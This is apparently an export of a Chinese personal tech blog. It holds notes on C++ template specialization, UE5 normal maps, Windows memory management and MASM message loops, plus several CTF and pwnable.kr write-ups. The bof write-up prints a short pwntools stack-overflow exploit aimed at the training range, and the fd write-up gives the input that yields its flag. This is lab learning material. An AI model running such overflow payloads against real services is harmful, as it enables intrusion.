    <url>/ctf-wp/pwn1-sctf-2016-wp/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>IDA分析错了+一些暂时悬而未决的疑点,故作记录</p>
<h2 id="正文">正文</h2>
<p>核心利用点在replace</p>
<p>这里我不赘述了,毕竟是老题,而且是简单题,wp思路可以看看其他师傅</p>
<p>这里主要是讲两点</p>
<p>一个是,貌似文件里面的所有STL函数的第一个参数都是这个</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050064.png" /></p>
<p>然后进去函数后函数会自动覆盖掉arg[0],再把所有参数下移4个偏移</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050278.png" /></p>
<p>再退出函数时,会把arg[0]再次设为这个值</p>
<p>这里这两点让我很在意</p>
<p>但是没有找到合适的说法,编译原理学的比较菜</p>
<p>暂且悬置</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>笔记</category>
        <category>存档</category>
        <category>二进制</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>悬而未决</tag>
      </tags>
  </entry>
  <entry>
    <title>偏特化模板函数杂谈</title>
    <url>/effective-c/pian-te-hua-mo-ban-han-shu-za-tan/</url>
    <content><![CDATA[<p>​ 注意到一个点: 偏特化模板类和全特化模板类, 以及全特化模板函数, 在C++11下都是合法的, 但是偏特化模板函数在C++11下是不合法的(据称, 某些编译器会错误的将偏特化模板函数接受为合法代码), 下图为笔者在vs2022下 C++14中测试结果</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202306172232774.png" alt="" /><figcaption>image-20230617223246327</figcaption>
</figure>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::cin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T1, <span class="keyword">typename</span> T2&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&lt;T, <span class="type">int</span>&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&lt;<span class="type">int</span>,<span class="type">char</span>&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T1, <span class="keyword">typename</span> T2&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">(T1 a, T2 b)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="type">void</span> <span class="built_in">foo</span>&lt; T, <span class="type">int</span> &gt;(<span class="type">int</span> a, <span class="type">int</span> b) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="type">void</span> foo &lt; <span class="type">int</span>, <span class="type">int</span> &gt;(<span class="type">int</span> a, <span class="type">int</span> b)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>有些版本的vs可以在静态分析时报错，我目前机子上的只能在编译时报错，而在我另一台机子上测试时，编译静态检查会报错， 报错信息是不允许使用偏特化模板函数</p>
<p>具体原因如下</p>
<p>https://stackoverflow.com/questions/40652694/why-does-the-c-standard-not-allow-function-template-partial-specialization</p>
<p>http://www.open-std.org/jtc1/sc22/wg21/docs/cwg_closed.html#229</p>
<p>简单来说就是, 类是不允许重载的, 而函数允许重载, 这意味着偏特化和重载需要同时作用于函数参数类型推导, 这样会导致编译器相关代码变动较大, 而且会变得很笨重, 因此C++11时没有添加这个feature, 往后也没有添加 直到现在</p>
]]></content>
      <categories>
        <category>C++简明进阶教程</category>
      </categories>
      <tags>
        <tag>C++简明进阶教程</tag>
      </tags>
  </entry>
  <entry>
    <title>UE5阶段性学习笔记1</title>
    <url>/gameplay/ue5-jie-duan-xing-xue-xi-bi-ji-1/</url>
    <content><![CDATA[<h2 id="meshes-materials-textures之间的区别">Meshes, Materials, textures之间的区别</h2>
<p>这里有一个描述比较好的资料</p>
<p>https://forums.unrealengine.com/t/static-meshes-vs-textures-vs-materials/53090</p>
<blockquote>
<p>Meshes are the actual geometry, they require a material to define what the surface looks like (color, reflectivity, etc.) Textures are just image files that are used within the material, so you could have an image that you make in Photoshop that you plug into a material that gets applied to a mesh. The Mesh uses something called UVW mapping, which is where the 3D model has a set of coordinates where it is flattened out so that it can use a 2D image as a texture, UVW is simply a way to refer to texturing coordinates (XYZ = UVW). In a 3D program like Blender/Maya/3ds Max they each have their own way of making materials and applying them to a 3D mesh. Usually each program has a very simple type of material that has basic features like color and if you use those basic materials on your 3D model then when you export to UE4 it can import those materials.</p>
</blockquote>
<p>总结为: 1. Meshes是空间概念, 是几何形体, 直译是<code>网格</code> 2. material是光学概念, 他决定了<code>网格</code>的样式, 直译是<code>材质</code> 3. texture是material所需要的图像文件, 直译是<code>纹理</code>, 也就是说<code>材质</code>包含了<code>纹理</code>, <code>法线贴图</code>也属于<code>纹理</code>, 各种<code>纹理</code>的有机结合形成了<code>材质</code></p>
<h2 id="法线贴图的原理">法线贴图的原理</h2>
<p>这部分内容unity文档写的比UE文档清晰明了(因为配有清晰的示意图)</p>
<p>链接 https://docs.unity3d.com/cn/2021.1/Manual/StandardShaderMaterialParameterNormalMap.html</p>
<p>法线贴图被称之为normal map</p>
<p>首先unity官方解释了另一个概念, 称之为<code>平滑着色</code></p>
<p>对于一个网格几何体, 其俯视图如下, 在不应用平滑着色时, 其表面法线标注如下</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202305021902627.png" alt="" /><figcaption>image-20230502190237603</figcaption>
</figure>
<p>注意三角形边缘的表面法线向量示意箭头</p>
<p>上述网格几何体的渲染图如下</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202305021903634.png" alt="" /><figcaption>image-20230502190343615</figcaption>
</figure>
<p>如果启用了平滑着色功能,</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202305021907491.png" alt="" /><figcaption>4C0579885F450AD1E6BBCF33C396ED58</figcaption>
</figure>
<p>边缘处的法线会变成红色向量所示</p>
<p>绿色线条和蓝色线条分别是unity官方和我自己画的示意线条, 用于示意渲染结果, 下图是渲染结果, 可以看到平滑的渲染结果</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202305021909364.png" alt="" /><figcaption>image-20230502190904345</figcaption>
</figure>
<p>需要注意的是, 当沿着掠射角(几乎垂直于法线的观察方向)观察上述物体时, 上述物体的渲染结果依旧是棱角分明的(大多数角度是正常的圆柱体渲染结果), 因为我们并没有实际修改<code>mesh</code> 只是修改了法线, 俯视图中的示意线条展现的印象曲面并不存在, 他是由于法线的渐变形成的观察印象</p>
<p>如果将上述技术更进一步的修改, 得到法线贴图</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202305021912274.png" alt="" /><figcaption>image-20230502191254253</figcaption>
</figure>
<p>法线贴图需要为每个像素点存储两个性质,</p>
<p>第一个性质是上图中下半部分所展示的橙色的单位向量, 这个单位向量描述了法线的方向</p>
<p>第二个性质是蓝色-红色格子所示意的每个像素深度(或者说是高度)信息</p>
<p>这两个信息结合起来就可以描述法线的修正, 因为法线也是一个向量, 描述向量只需要两个标量, 一个是方向一个是长度</p>
<p>需要注意的是, 法线贴图虽然看起来是蓝色的, 但是他不影响任何颜色, 他只会影响法线, 从而间接影响光照计算</p>
<p>法线贴图呈现蓝色的原因是 法线贴图采用和普通图片几乎相同的物理存储方式--他采用RGB记录高度和方向数据, RGB分别代表了空间中的xyz数据, 其中Z表示"向外", "(本地坐标系的)向上"</p>
<p>存储的RGB值(x,y,z)会映射为法线数据(2x-1,2y-1,2z-1)</p>
<p>(至于为什么这样映射, 这是和值域定义域范围有关的, 不展开)</p>
<p>所以RGB 值 (0.5, 0.5, 1) 或十六进制的 #8080FF 将得到矢量 (0,0,1) 表示模型表面没有变化, 上述颜色如下所示, 呈现为蓝色</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202305021922630.png" alt="" /><figcaption>#8080FF</figcaption>
</figure>
<p>高度贴图和法线贴图的区别</p>
<p><strong>法线贴图</strong>和<strong>高度贴图</strong>都是凹凸贴图的<em>类型</em></p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202305021942264.png" alt="" /><figcaption>image-20230502194259207</figcaption>
</figure>
<p>最后一个问题 法线贴图是从哪来的, 答案是建模师搞得, 他需要建模时导出法线贴图</p>
<p>(待补充)</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>GamePlay</category>
      </categories>
      <tags>
        <tag>GamePlay</tag>
        <tag>UE</tag>
      </tags>
  </entry>
  <entry>
    <title>MMU笔记（2） 虚拟内存</title>
    <url>/mmu-bi-ji/mmu-bi-ji-2-gong-xiang-nei-cun-ying-she-ji-zhi/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>先讲讲缓存区到底是什么</p>
<p>简单来说就是很久很久以前，CPU只能操作内存，没法直接操作硬盘，而大文件无法直接从硬盘塞到内存里面</p>
<p>所以就一块块读取，有点类似于现在的分页机制</p>
<h2 id="正文">正文</h2>
<p>直接把硬盘当作虚拟内存的最大好处就是，可以节省转存缓冲区的开销，整个文件都可以视作处于内存中，将一整个文件直接映射到进程的地址空间，这样可以通过指针用读写的办法直接存取文件内容，也就手动维护IO操作时经常见到的fp指针</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
  </entry>
  <entry>
    <title>MMU笔记（3） 对堆I/O过程的多线程优化思路</title>
    <url>/mmu-bi-ji/mmu-bi-ji-3-dui-dui-i-o-guo-cheng-de-duo-xian-cheng-you-hua-si-lu/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>本文的讨论基于现代Windows操作系统堆管理API，不包含任何stdmem系列函数</p>
<h2 id="正文">正文</h2>
<p>众所周知，Windows的堆分为默认堆和私有堆，而私有堆其实就是分配在默认堆上面的，换句话来说蛋糕不会变大，都是4GB空间</p>
<p>默认堆可以被直接使用，但是为了防止多线程之间对某一块内存doubleCheck，doubleFree等，所以对默认堆进行异步操作是非法的，如果同时有两个线程操作同一个默认堆，实际上程序效率是变低的，因为需要等待上下文</p>
<p>正确做法是分配私有堆，私有堆是预留的，受保护的</p>
<p>私有堆还有一个好处是</p>
<p>当我们发现进程A的程序逻辑偏离预期时，我们一般都会从A查起，但是其实这有可能是B对默认堆的误操作造成的：私有堆降低了维护难度</p>
<h2 id="补充">补充</h2>
<p>请求新堆时的操作为：</p>
<p>（1）遍历已分配的和空闲的内存块的链接表。<br />
（2）寻找一个空闲内存块的地址。<br />
（3）通过将空闲内存块标记为“已分配”来分配新内存块。<br />
（4）将新内存块添加给内存块链接表。</p>
<p>可以发现，如果线程A执行完 （1） （2） 后，系统切换到线程B执行 （1）（2），并且他们都找到了同一块内存，这样的后果是灾难性的，因此堆和堆链表的访问权是独占的，而私有堆则是专有的</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
  </entry>
  <entry>
    <title>MMU笔记（4） 内存页映射与内存共享机制</title>
    <url>/mmu-bi-ji/mmu-bi-ji-4-nei-cun-ye-ying-she-yu-nei-cun-gong-xiang-ji-zhi/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>这部分内容主要看的是《琢石成器》一书，这部分写的非常不好（之前的内容一直看的很舒服），有很多关键内容说的太含糊，措辞不严谨，查了一些东西，整理如下</p>
<h2 id="正文">正文</h2>
<p>有问题的文段很多，单独拎出来几个，然后再附上作者实际上想表述的意思</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172117030.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172116497.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050453.png" /></p>
<p>其实是应该这样理解：</p>
<p>首先我们不应该把磁盘中的内容认为是内存页的一部分，也就是说磁盘分页虽然是存在的，但是两种页是不同的东西</p>
<p>而当我们说“提交页面”的时候，默认语境其实是“把虚拟地址空间当中的内存页提交给MMU，再由MMU映射到物理内存的页框当中”，而文中混淆了这一默认语境与“将仍处于磁盘当中的数据分页成内存形式，然后提交给虚拟内存地址空间（虚拟内存后续会再经由MMU提交给物理内存）”</p>
<p>另外，“物理储存器”也有一定迷惑性，虽然该词确实可以表示磁盘空间，但是在书中上下文语境下很容易理解为物理内存，实际上指的是纯粹的磁盘空间</p>
<p>所以完整的过程是：</p>
<p>首先PE文件申请其独占的虚拟内存空间，然后加载它自身的代码段，数据段还有外部dll等等，同时实时映射到物理内存</p>
<p>当代码运行到某处需要使用磁盘文件时，磁盘文件会提交到虚拟内存地址空间，然后实时映射到物理内存</p>
<h2 id="补充">补充</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172117489.png" /></p>
<p>这句甚至是完全错误的，作者自己都搞混了，物理储存器这个词就不应该在内存管理这一章节出现</p>
<p>这句话翻译一下就是，<strong>可以从物理内存读入内存</strong></p>
<p>写前半句的时候想的是物理储存器是磁盘空间，写后半句的时候想的是物理储存器是物理内存</p>
<h2 id="补充2">补充2</h2>
<p>有一段话可以写的更好一些</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172117208.png" /></p>
<p>这句话有点像我之前提到的：不应该把虚拟内存看作物理内存的延申空间，而应该把虚拟内存看作磁盘空间</p>
<p>我们只是在磁盘空间上面划分页框和权限而已</p>
<h2 id="补充3">补充3</h2>
<p>PE的虚拟内存地址空间，也就是每个进程独有的连续平坦内存空间</p>
<p>和</p>
<p>物理内存暂时借用磁盘空间产生的虚拟内存</p>
<p>二者太容易搞混，翻译的不好，本文因为这个原因修改了好几次措辞</p>
<p>因此，此后笔者会称前者为私有内存或虚拟内存，或者线性内存，线性地址，称后者为磁盘内存，磁盘内存空间</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
  </entry>
  <entry>
    <title>MMU笔记（5） 要把线性地址、物理地址、磁盘空间、磁盘地址结合起来看待</title>
    <url>/mmu-bi-ji/mmu-bi-ji-5-yao-ba-xian-xing-di-zhi-wu-li-di-zhi-ci-pan-kong-jian/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>在学习内存相关的知识时，映射不应被看作是一个普通的指针，而应该是被看作是双向指针，或者是迭代器</p>
<h2 id="正文">正文</h2>
<p>算是真正理解了映射，虽然细节上会有一些出入（因为那些细节有点太深了，不知道如何观察，比如先后顺序什么的，姑且先不考虑），但是下面的内容如果能把映射这一操作理解为迭代器，或者双向指针就好理解很多了</p>
<p>线性内存的某一块映射到物理内存，这并不是单纯意味着物理内存指向线性内存的指针，同理，把磁盘文件映射到线性内存也不单是指向磁盘内存的fp指针，因为他们是双向互认的</p>
<p>假设用户程序A需要使用到用户自行编写的dll库B，其他任何程序都不会使用B</p>
<p>那么在打开A的时候物理内存当中并未加载B，因此A掷错缺页，尝试加载B，但并非直接加载而是先从磁盘空间加载到线性内存，再映射物理内存</p>
<p>如果调用的是已经存在物理内存当中的dll，这时候就要结合起来看待了，首先尝试把磁盘当中的dll映射到线性内存，但是操作系统维护的表表明该DLL已经加载到物理内存了，这时候是便是从物理内存映射到线性内存了</p>
<p>这样挺难理解的，因为我们并不能说从线性内存映射到物理内存，因为不能说一个没有的东西映射到已经存在的东西上面（实际上很多地方就是这样说的，个人感觉不好）</p>
<p>但是从物理内存映射到线性内存也不是很好理解，因为线性内存是会经过MMU映射到物理内存的有点回调的味道</p>
<p>所以应该把这种映射理解为双向互认，是一种迭代（实际是查表，操作系统维护一张表，但是查表个人感觉就复杂了，如果描述成迭代就好理解多了），而非简单的单向指针</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
  </entry>
  <entry>
    <title>用汇编编写消息系统 (3) 窗体程序逆向入手思路</title>
    <url>/windows-xiao-xi-kai-fa/yi-xiao-xi-wei-dao-xiang-de-you-xian-zhuang-tai-ji-li-nian-windows-cheng-xu-she-ji-bi-ji-2/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>拿到一个窗体程序该如何确定逆向的开始点</p>
<h2 id="正文">正文</h2>
<p>我们先假设没有任何可搜索字符串，这一点笔者是遇到过的，所有字符串都是加密的，打印函数前一个函数会解密字符串，解密出“please input flag”之类的内容，然后再传参给print，有一种理论上可行但是非常不好弄的方法：动调，并动调至解密之后再去搜索字符串</p>
<p>要确定这个时机的前提几乎就是找到函数主体入口点（三者离的很近：main入口点，解密函数，print）</p>
<p>本文讲解几种一般方法</p>
<p>首先是直接运行，观察窗体特征，然后确定以下断点</p>
<p>通过窗体的样式确定MessageBox 的type参数，直接搜索push xxx指令一般来说只会搜到几条结果</p>
<p>是否使用了GetDlgItemText</p>
<p>该程序看起来有没有复杂的消息循环</p>
<p>这些都是很重要的断点位置，基本接近main函数入口点</p>
<p>另外对于有按钮，且按钮是关键扳机的窗体程序，我们可以在句柄页面找到特定按钮，直接断下按钮</p>
<p>按钮作为一种典型的状态机，拥有两种状态，我们还可以选择具体断下哪个状态（WM_LBUTTONUP和WM_LBUTTONDOWN）</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>Windows</category>
      </categories>
  </entry>
  <entry>
    <title>用汇编编写消息系统 (4) 高效检测状态机某一状态的方法</title>
    <url>/windows-xiao-xi-kai-fa/yi-xiao-xi-wei-dao-xiang-de-you-xian-zhuang-tai-ji-li-nian-windows-cheng-xu-she-ji-bi-ji-3/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>这里还是一个多线程的例子，感觉笔者在多线程的知识树上越走越远了....看完主要内容之后得赶紧回到主路上。</p>
<p>如果是单线程状态机，状态是不需要检测的，因为状态切换的时机是确定的</p>
<p>对于多线程的状态机，检测其他线程的状态，比较傻的办法就是一个死循环然后switch case，这样会占用大量的CPU时间片，最要命的是即使线程挂起也会消耗时间片，即使用户不进行任何操作，状态不发生任何变化，依旧消耗时间片</p>
<p>因此while true在这时并不是一个好做法</p>
<h2 id="正文">正文</h2>
<p>首先底层原理还是委托的分发和回收与触发回调</p>
<p>通过创建事件分支节点，来建立监听点（listen），再WaitForSingleObject与switch case配合，建立分支</p>
<p>顺便补一个事件的知识点</p>
<p>置位和复位</p>
<p>置位就是触发，复位就是等待触发，可以理解为一个抓动物的陷阱</p>
<p>还有一个自动复位机制，文档上很详细，需要抄的时候再说</p>
<h2 id="补充">补充</h2>
<p>WaitForSingleObject 函数可以做到内陷+互斥锁,而互斥锁主要是通过一系列硬件实现的</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>Windows</category>
      </categories>
  </entry>
  <entry>
    <title>用汇编编写消息系统 (2.2) 内存的内存断点和硬件断点的区别</title>
    <url>/windows-xiao-xi-kai-fa/yi-xiao-xi-wei-dao-xiang-de-you-xian-zhuang-tai-ji-li-nian-windows-cheng-xu-she-ji-bi-ji/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>根据Windows内存处理机制，任何内存当中的内容都是分页加载的，而在保护模式下，内存页有许多属性，包括可不可读，写，运行等</p>
<h2 id="正文">正文</h2>
<p>内存的内存断点是软件层面（操作系统这个大软件和调试软件本身）控制的</p>
<p>如果是写入断点则设置页属性PAGE_EXECUTE_READ，不可写，一旦写入就会掷错，这也从一定程度上证明了断点属于一种异常</p>
<p>如果是访问断点就设置PAGE_NOACCESS，禁止访问，然后catch exception</p>
<p>现在有一个小问题，如果是同页但是非目标地址的内存，也会被断点，这需要调试器层面放行，但是有点想象不出来如何实现这种放行</p>
<p>硬件断点则是cpu硬件层面的</p>
<p>在CPU硬件层面提供多个寄存器用于描述目标内存对象，一旦cpu访问或写入该对象则断下断点，<strong>效率比前者高了很多个数量级</strong></p>
]]></content>
      <categories>
        <category>开发</category>
        <category>Windows</category>
      </categories>
  </entry>
  <entry>
    <title>用汇编编写消息系统 (2.1) 三种常见消息处理机制概念及设计</title>
    <url>/windows-xiao-xi-kai-fa/yi-xiao-xi-wei-dao-xiang-de-you-xian-zhuang-tai-ji-li-nian-windows-cheng-xu-she-ji-hui-bian-2/</url>
    <content><![CDATA[<p>上一篇讲了最常见的一种：</p>
<p>while true循环GetMessage期间检查WM_QUIT，并分派、处理消息</p>
<p>讲讲其他两种以及三种的区别（主要是性能上的）</p>
<h2 id="正文">正文</h2>
<p>首先是，为什么需要GetMessage？我们既然已经引入了委托回调机制，那么完全可以让操作系统直接把消息发送给回调函数（假定回调函数已经注册了，这个不是技术难点），当回调函数发现窗口关闭时执行break，而剩下的整个主程序都是while true循环，如下所示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">invoke CreateWindow,…</span><br><span class="line">invoke ShowWindow,…</span><br><span class="line">invoke UpdateWindow,…</span><br><span class="line">.while dwQuitFlag == 0 ;要退出时在窗口过程中设置dwQuitFlag</span><br><span class="line">.endw</span><br><span class="line">invoke ExitProcess,…</span><br></pre></td></tr></table></figure>
<p>这个问题的答案是，GetMessage是系统函数，可以让程序心甘情愿地在空闲时间将时间片移交给操作系统，将这个等待循环（while true）移交给操作系统内部，而操作系统内部的while true会更有利于整机性能，这也变相解释了为什么在空闲的时候系统中断这个进程倾向于占用接近100%的CPU</p>
<p>简单来说就是空闲资源要尽可能停留在操作系统层面，而非用户程序层面</p>
<p>所以这个形式的消息处理模块是负优化</p>
<p>另一种形式则是正优化（某种意义上），使用peekMessage函数，该函数与GetMessage的区别在于，GetMessage会在消息队列空闲时内陷于操作系统内核，而在相同情况下 peekMessage 会立刻返回一个NULL表示消息队列空闲，这种情况下如果采用上一篇文章的常规做法，当前时间片就会完全陷入在不处理任何工作的等待循环（在GetMessage内部），虽说 空闲资源要尽可能停留在操作系统层面，而非用户程序层面</p>
<p>但若空闲资源能够由用户程序利用，而非单纯停留在操作系统内部，有时候会更好，至于为什么是有时候后面会讲</p>
<p>如果监测到消息队列空闲，我们可以做一些诸如检查程序更新，发送错误报告之类的事情</p>
<p>但是不能做太大的工作，设函数foo是一个极为庞大的单线程非异步函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.while TRUE</span><br><span class="line">    invoke PeekMessage,addr @stMsg,NULL,0,0,PM_REMOVE</span><br><span class="line">    .if eax</span><br><span class="line">        .break .if @stMsg.message == WM_QUIT</span><br><span class="line">        invoke TranslateMessage,addr @stMsg</span><br><span class="line">        invoke DispatchMessage,addr @stMsg</span><br><span class="line">        .else</span><br><span class="line">        call foo  ;foo函数</span><br><span class="line">        .endif</span><br></pre></td></tr></table></figure>
<p>假想一种情况：</p>
<p>某一瞬间检测到消息队列空闲, 进入else空闲任务列表,执行非异步函数foo,由于该函数过于庞大,未等执行完操作系统便结束了当前时间片，更甚在foo执行过程中出现了新消息，而foo非异步，用户程序控制权内陷于其中，直到该函数返回，导致期间返回前窗口迟滞</p>
<p>所以这种消息队列处理逻辑设计只能说是 ”有时候会更好“</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>Windows</category>
      </categories>
  </entry>
  <entry>
    <title>用汇编编写消息系统 (1) 一些基本知识点、向操作系统注册一个窗口</title>
    <url>/windows-xiao-xi-kai-fa/yi-xiao-xi-wei-dao-xiang-de-you-xian-zhuang-tai-ji-li-nian-windows-cheng-xu-she-ji-hui-bian/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>会开发才会逆向，然而笔者越来越发现其实自己对实际生产环境中的Windows程序设计理念一无所知，谨以此系列文章记录</p>
<h2 id="正文">正文</h2>
<p>笔者有过用最蠢的方式开发Windows窗体程序的经验，示例程序是计算器，要求是支持分数</p>
<p>前期觉得挺简单的，越到收尾越发现一系列问题，简单来说有以下：</p>
<p>如果要支持括号运算的话，手写符号顺序树太难了，于是笔者做法是托管JSengine，使用JS的eval函数</p>
<p>由于需要支持分数线，所以必须符号和数字分开，然后就会造成delete键的逻辑需要非常多的if，因为需要判断接下来删除的是什么，是普通符号还是分数线还是数字？</p>
<p>而其实Windows窗体程序并不是这样的设计逻辑，题主在开发初期找了网上一些程序源码借鉴，找到的三四份源码都是这种错误的设计逻辑，因此笔者也跟着这个逻辑写，陷入了误区</p>
<p>其实这里最重要的一点就是简单CUI程序和Windows窗体程序之间的一个不同点：</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181052750.png" /></p>
<p>回到计算器的例子，用户点击任何按钮都是顺序，次数不定的，这就导致了我前期写函数逻辑，写封装很爽，一写一个爽，但是后期却需要一堆if嵌套判断调用逻辑顺序，同时如果需要加入异常输入检测的话，if数量，层数直接爆炸，完全没法继续写，最终导致重写整个逻辑</p>
<p>回到正确做法，正确做法应该是用一个while true把消息获取，消息处理逻辑括起来，再加一句break（当程序退出时触发）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.while TRUE</span><br><span class="line">        invoke GetMessage,addr @stMsg,NULL,0,0</span><br><span class="line">        .break .if eax == 0</span><br><span class="line">        invoke TranslateMessage,addr @stMsg</span><br><span class="line">        invoke DispatchMessage,addr @stMsg</span><br><span class="line">.endw</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>开发</category>
        <category>Windows</category>
      </categories>
  </entry>
  <entry>
    <title>pwnable靶场ak-WP （0）前期准备</title>
    <url>/pwnable-ba-chang/pwnable-ba-chang-ak-wp-0-qian-qi-zhun-bei/</url>
    <content><![CDATA[<p>安装xftp便于后续操作，因为这个靶场的所有题目都是用ftp连接过去命令行下载的</p>
<p>最好挂上梯子，不然太慢</p>
<p>网址https://pwnable.kr/play.php</p>
<p>很巧的是网站里面的图标全是笔者本命作之一 RO的收集卡片的原画</p>
<p>靶场IP直连为128.61.240.205（有的时候DNS解析不了）</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>笔记</category>
        <category>存档</category>
        <category>二进制</category>
      </categories>
  </entry>
  <entry>
    <title>pwnable靶场ak-WP （1）FD利用</title>
    <url>/pwnable-ba-chang/pwnable-ba-chang-ak-wp-1-fd-li-yong/</url>
    <content><![CDATA[<p>连接上去之后ls先看一看</p>
<p>发现三个文件，其中一个没有权限</p>
<p>分析二进制文件fd</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050197.png" /></p>
<p>可以看出需要使用fd0</p>
<p>直接输入4660即可</p>
<p>即可获取flag</p>
<h2 id="补充">补充</h2>
<p>补一个fd的笔记</p>
<p>之前一直很奇怪为什么read还需要指明fd</p>
<p>翻了一下文档就明白了</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181050137.png" /></p>
<p>“from fd”</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>笔记</category>
        <category>存档</category>
        <category>二进制</category>
      </categories>
  </entry>
  <entry>
    <title>pwnable靶场ak-WP （3）bof利用</title>
    <url>/pwnable-ba-chang/pwnable-ba-chang-ak-wp-3-bof-li-yong/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>自己琢磨了一下口算十六进制的加减法和正负数运算，在EBP分界处计算偏移还是挺有用的</p>
<h2 id="正文">正文</h2>
<p>本体难度低，补一个栈笔记就行</p>
<p>虽然栈是向低地址增长的，但是由于宏观遍历和微观计数器变化需要统一——即当从0遍历到高位时，计数器从0开始步进，步长为1，因此gets一次性存储一个长字符串时，字符串的低位字符，存在地址的高位（看起来似乎和小端相反，但前面也说过，其实小端研究的不是这个）</p>
<p>EXP如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">conn=remote(&quot;128.61.240.205&quot;,9000)</span><br><span class="line">conn.sendline(&#x27;AAAA&#x27;*13+ p32(0xCAFEBABE))</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
<p>payload是</p>
<p>AAAA....AAAACAFEBABE</p>
<p>字符串低位CAFEBABE储存在栈的高位（ebp栈底之外）</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053924.png" /></p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>笔记</category>
        <category>存档</category>
        <category>二进制</category>
      </categories>
  </entry>
  <entry>
    <title>pwnable靶场ak-WP （4）壳逆向 flag</title>
    <url>/pwnable-ba-chang/pwnable-ba-chang-ak-wp-4-ke-ni-xiang-flag/</url>
    <content><![CDATA[<h2 id="思路">思路</h2>
